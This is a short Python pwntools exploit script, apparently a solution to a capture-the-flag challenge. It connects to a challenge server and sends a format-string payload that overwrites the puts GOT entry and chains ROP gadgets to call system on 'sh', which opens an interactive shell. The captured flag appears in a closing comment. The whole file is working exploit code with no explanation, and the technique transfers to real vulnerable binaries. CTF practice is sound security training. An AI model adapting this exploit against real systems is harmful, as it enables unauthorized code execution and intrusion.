from pwn import *

r = remote("got.ictf.kctf.cloud", 1337)
# r = process("./vuln")
# gdb.attach(r, api=True)

r.recvuntil(b"printed:")


sh = 0x404500
system = 0x4010b0
main = 0x00000000004011d6
pop_rdi_ret = 0x0000000000401323
pop5_ret = 0x000000000040131b
puts_got = 0x404018

payload = b"%14$n%26739p%11$n%4172456p%13$n-" \
        + p64(pop_rdi_ret) + p64(sh) + p64(system) \
        + p64(puts_got) + p64(puts_got + 4)
r.sendline(payload)

r.interactive()

# ictf{f0rmat_strings_are_so_cool_tysm_rythm_for_introducing_me}